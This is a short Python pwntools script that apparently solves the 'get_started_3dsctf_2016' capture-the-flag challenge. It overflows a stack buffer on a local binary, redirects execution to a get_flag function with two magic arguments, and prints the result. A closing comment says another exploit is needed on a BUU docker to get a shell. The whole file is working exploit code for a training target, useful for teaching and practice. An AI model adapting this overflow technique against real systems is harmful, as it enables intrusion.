from pwn import *

context(arch='i386', os='linux', log_level='DEBUG')
p = process('./get_started_3dsctf_2016')

get_flag = 0x80489a0
payload = flat(['a'*0x38,get_flag,'a'*4,0x308cd64f,0x195719d1])
p.sendline(payload)

print p.recv()

# on BUU docker, I think something is mistaken and you'll need to use the exp for not_the_same_3dsctf_2016 to getshell